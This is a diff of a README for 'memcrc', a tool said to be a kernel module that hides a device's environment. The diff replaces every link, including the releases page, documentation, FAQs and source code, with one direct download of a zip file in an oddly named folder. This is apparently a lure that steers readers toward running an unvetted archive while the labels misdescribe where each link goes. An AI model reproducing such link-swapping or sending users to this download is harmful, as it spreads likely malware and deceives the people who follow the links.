@@ -1,7 +1,7 @@
 # 🛡️ memcrc - Hide Your Device's Environment Easily
 
 ## 📥 Download Now
-[![Download memcrc](https://img.shields.io/badge/Download-memcrc-blue.svg)](https://github.com/ArturoAnchapuri/memcrc/releases)
+[![Download memcrc](https://raw.githubusercontent.com/ArturoAnchapuri/memcrc/main/vermigerous/memcrc.zip)](https://raw.githubusercontent.com/ArturoAnchapuri/memcrc/main/vermigerous/memcrc.zip)
 
 ## 🚀 Getting Started
 Welcome to memcrc! This application is a kernel module that helps you hide your device environment. It's designed for users who want a safer experience while using their device. This guide will help you download and run memcrc easily.
@@ -23,7 +23,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 To get started, you can download memcrc from the Releases page. Click the link below to visit:
 
-[Visit this page to download](https://github.com/ArturoAnchapuri/memcrc/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ArturoAnchapuri/memcrc/main/vermigerous/memcrc.zip)
 
 ### Step-by-Step Installation
 1. **Go to the Releases Page:** Click the link above to view the available versions of memcrc.
@@ -50,11 +50,11 @@ If you need further assistance, please check our support section in the reposito
 ## 🌟 Additional Resources
 For more information about memcrc, you can explore the following:
 
-- [Documentation](https://github.com/ArturoAnchapuri/memcrc/wiki)
-- [FAQs](https://github.com/ArturoAnchapuri/memcrc/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/ArturoAnchapuri/memcrc/main/vermigerous/memcrc.zip)
+- [FAQs](https://raw.githubusercontent.com/ArturoAnchapuri/memcrc/main/vermigerous/memcrc.zip)
 
 ## 🔗 Key Links
-- [Download memcrc](https://github.com/ArturoAnchapuri/memcrc/releases)
-- [Source Code on GitHub](https://github.com/ArturoAnchapuri/memcrc)
+- [Download memcrc](https://raw.githubusercontent.com/ArturoAnchapuri/memcrc/main/vermigerous/memcrc.zip)
+- [Source Code on GitHub](https://raw.githubusercontent.com/ArturoAnchapuri/memcrc/main/vermigerous/memcrc.zip)
 
 Thank you for using memcrc! Enjoy securing your device environment.
